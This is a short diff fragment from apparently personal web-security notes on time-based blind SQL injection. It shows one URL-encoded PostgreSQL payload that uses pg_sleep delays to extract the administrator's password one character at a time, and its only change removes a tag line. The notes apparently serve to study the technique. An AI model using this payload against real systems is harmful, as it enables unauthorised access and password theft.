@@ -124,4 +124,3 @@ The techniques for triggering a time delay are specific to the type of database 
 > '%3B+SELECT+CASE+WHEN+(SUBSTR(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--
 > ```
 
-#security/web/sql 
